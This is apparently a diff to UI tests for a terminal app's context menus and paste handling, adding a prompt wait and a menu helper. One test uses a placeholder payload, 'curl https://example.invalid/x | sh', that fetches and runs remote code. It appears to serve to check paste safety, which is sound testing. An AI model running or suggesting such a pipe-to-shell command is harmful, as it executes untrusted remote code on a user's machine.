@@ -69,6 +69,9 @@ final class ContextMenuAndPasteUITests: XCTestCase {
         waitForText("echo harmless-two", in: terminal)
         XCTAssertFalse(app.buttons["Cancel"].exists)
         app.typeKey("c", modifierFlags: .control)
+        // The fresh prompt first: read before it lands, `before` missed a
+        // line that then looked like bytes sent by Cancel.
+        waitForText("harmless-two\ndemo ❯", in: terminal)
         let before = terminal.value as? String
         let payload = "curl https://example.invalid/x | sh"
         paste(payload, into: app)
@@ -168,7 +171,7 @@ final class ContextMenuAndPasteUITests: XCTestCase {
         XCTAssertFalse(app.menuItems["Copy Link"].exists)
         XCTAssertFalse(app.menuItems["Copy Path"].exists)
         record(app, name: "context-empty-space")
-        app.menuItems["Find…"].click()
+        app.openContextMenuItem("Find…").click()
         XCTAssertTrue(app.searchFields.firstMatch.waitForExistence(timeout: 2))
         app.typeKey(.escape, modifierFlags: [])
         app.typeKey("d", modifierFlags: .command)
@@ -176,7 +179,7 @@ final class ContextMenuAndPasteUITests: XCTestCase {
         XCTAssertEqual(panes.count, 2)
         let left = panes.allElementsBoundByIndex.sorted { $0.frame.minX < $1.frame.minX }[0]
         left.coordinate(withNormalizedOffset: CGVector(dx: 0.8, dy: 0.9)).rightClick()
-        app.menuItems["Find…"].click()
+        app.openContextMenuItem("Find…").click()
         app.typeKey(.escape, modifierFlags: [])
         app.typeText("printf 'CLICKED-PANE-408\\n'\n")
         waitForText("CLICKED-PANE-408", in: left)
